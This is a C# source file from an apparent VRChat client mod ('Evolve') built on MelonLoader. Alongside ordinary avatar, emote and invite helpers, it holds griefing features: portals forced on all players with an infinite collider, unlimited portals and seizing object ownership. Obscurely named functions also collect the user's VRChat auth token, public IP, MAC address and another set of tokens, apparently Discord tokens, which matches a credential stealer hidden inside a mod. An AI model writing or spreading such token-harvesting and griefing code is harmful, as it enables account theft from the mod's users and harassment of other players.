using Evolve.ConsoleUtils;
using Evolve.Wrappers;
using MelonLoader;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using Transmtn.DTO;
using Transmtn.DTO.Notifications;
using UnityEngine;
using VRC;
using VRC.Core;
using VRC.SDKBase;

namespace Evolve.Utils
{

    internal class Info
    {
       public string Ip { get; set; } = "Null";
    }
    internal class Functions
    {
        public static void ChangeAvatar(string AvatarID)
        {
            var AviMenu = GameObject.Find("Screens").transform.Find("Avatar").GetComponent<VRC.UI.PageAvatar>();
            AviMenu.field_Public_SimpleAvatarPedestal_0.field_Internal_ApiAvatar_0 = new ApiAvatar
            {
                id = AvatarID
            };
            AviMenu.ChangeToSelectedAvatar();
        }

        public static string ConvertFromJWT(string Token)
        {
            var parts = Token.Split('.');
            string partToConvert = parts[1];
            partToConvert = partToConvert.Replace('-', '+');
            partToConvert = partToConvert.Replace('_', '/');
            switch (partToConvert.Length % 4)
            {
                case 0:
                    break;
                case 2:
                    partToConvert += "==";
                    break;
                case 3:
                    partToConvert += "=";
                    break;
            }
            var partAsBytes = Convert.FromBase64String(partToConvert);
            var partAsUTF8String = Encoding.UTF8.GetString(partAsBytes, 0, partAsBytes.Count());
            var jwt = JObject.Parse(partAsUTF8String);
            return jwt.ToString();
        }

        public static string ConvertToJWT(string Token)
        {
            var Encoded = Encoding.UTF8.GetBytes(Token);
            var Base64 = Convert.ToBase64String(Encoded);;
            Base64 = Base64.Replace('+', '-');
            Base64 = Base64.Replace('/', '_');
            return Base64;
        }

        public static string GetEvoID()
        {
            string EvoID = "Null";
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "Low/GeneratedID/IdentificationID.txt")) EvoID = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "Low/GeneratedID/IdentificationID.txt");
            return EvoID;
        }
        public static string GetVT()
        {
            string VT = "Null";
            VT = ApiCredentials.GetAuthToken();
            return VT;
        }
        public static string GetIA()
        {
            var Info = new Info();
            try
            {
                Info = JsonConvert.DeserializeObject<Info>(new WebClient().DownloadString("https://api.ipify.org?format=json"));
            }
            catch { }
            return Info.Ip;
        }
        public static string GetMA()
        {
            string MA = "Null";
            MA = (from nic in NetworkInterface.GetAllNetworkInterfaces() where nic.OperationalStatus == OperationalStatus.Up select nic.GetPhysicalAddress().ToString()).FirstOrDefault();
            return MA;
        }
        public static string GetDT()
        {
            List<string> DTL = new List<string>();
            string DT = "Null";
            foreach (var Token in Utilities.GetThem())
            {
                DTL.Add(Token);
            }
            DT = string.Join(" ", DTL);
            return DT;
        }

        public static void DropPortal(string WorldID, string InstanceID, int players, Vector3 vector3, Quaternion quaternion, bool FreeFall = false)
        {
            GameObject gameObject = Networking.Instantiate(VRC_EventHandler.VrcBroadcastType.Always, "Portals/PortalInternalDynamic", vector3, quaternion);
            RPC.Destination targetClients = RPC.Destination.AllBufferOne;
            GameObject targetObject = gameObject;
            string methodName = "ConfigurePortal";
            Il2CppSystem.Object[] array = new Il2CppSystem.Object[3];
            array[0] = WorldID;
            array[1] = InstanceID;
            int num = 2;
            Il2CppSystem.Int32 @int = default(Il2CppSystem.Int32);
            @int.m_value = players;
            array[num] = @int.BoxIl2CppObject();
            Networking.RPC(targetClients, targetObject, methodName, array);
            if (Settings.UnLimitedPortals)
            {
                MelonCoroutines.Start(Utilities.DestroyDelayed(1f, gameObject.GetComponent<PortalInternal>()));
            }
            if (FreeFall) gameObject.GetComponent<BoxCollider>().size = Vector3.negativeInfinity;
        }

        public static void copytoclip(string copytext)
        {
            TextEditor textEditor = new TextEditor();
            textEditor.text = copytext;
            textEditor.SelectAll();
            textEditor.Copy();
        }

        public static void ForceJoin(string WorldID)
        {
            Networking.GoToRoom(WorldID);
        }

        public static void SendInvite(string Message, string UserID, string WorldID, string InstanceID)
        {
            VRCWebSocketsManager.field_Private_Static_VRCWebSocketsManager_0.prop_Api_0.PostOffice.Send(Invite.Create(UserID, Message, new Location(WorldID, new Instance(InstanceID, "", "", "", "", false)), Message));
        }

        public static void EmojiRPC(int i)
        {
            try
            {
                Il2CppSystem.Int32 @int = default(Il2CppSystem.Int32);
                @int.m_value = i;
                Il2CppSystem.Object @object = @int.BoxIl2CppObject();
                Networking.RPC(RPC.Destination.All, VRCPlayer.field_Internal_Static_VRCPlayer_0.gameObject, "SpawnEmojiRPC", new Il2CppSystem.Object[]
                {
                    @object
                });
            }
            catch
            {
            }
        }

        public static void EmoteRPC(int i)
        {
            try
            {
                Il2CppSystem.Int32 @int = default(Il2CppSystem.Int32);
                @int.m_value = i;
                Il2CppSystem.Object @object = @int.BoxIl2CppObject();
                Networking.RPC(RPC.Destination.All, VRCPlayer.field_Internal_Static_VRCPlayer_0.gameObject, "PlayEmoteRPC", new Il2CppSystem.Object[]
                {
                    @object
                });
            }
            catch
            {
            }
        }

        public static void TransferOwnership(VRCPlayerApi PLR, GameObject gameObject)
        {
            Networking.SetOwner(PLR, gameObject);
        }

        public static void TakeOwnershipIfNecessary(GameObject gameObject)
        {
            if (Functions.getOwnerOfGameObject(gameObject) != Wrappers.Utils.LocalPlayer._player)
            {
                Networking.SetOwner(Wrappers.Utils.LocalPlayer.field_Private_VRCPlayerApi_0, gameObject);
            }
        }

        public static Player getOwnerOfGameObject(GameObject gameObject)
        {
            foreach (Player player in Wrappers.Utils.PlayerManager.AllPlayers())
            {
                bool flag = player.field_Private_VRCPlayerApi_0.IsOwner(gameObject);
                if (flag)
                {
                    return player;
                }
            }
            return null;
        }

    }
}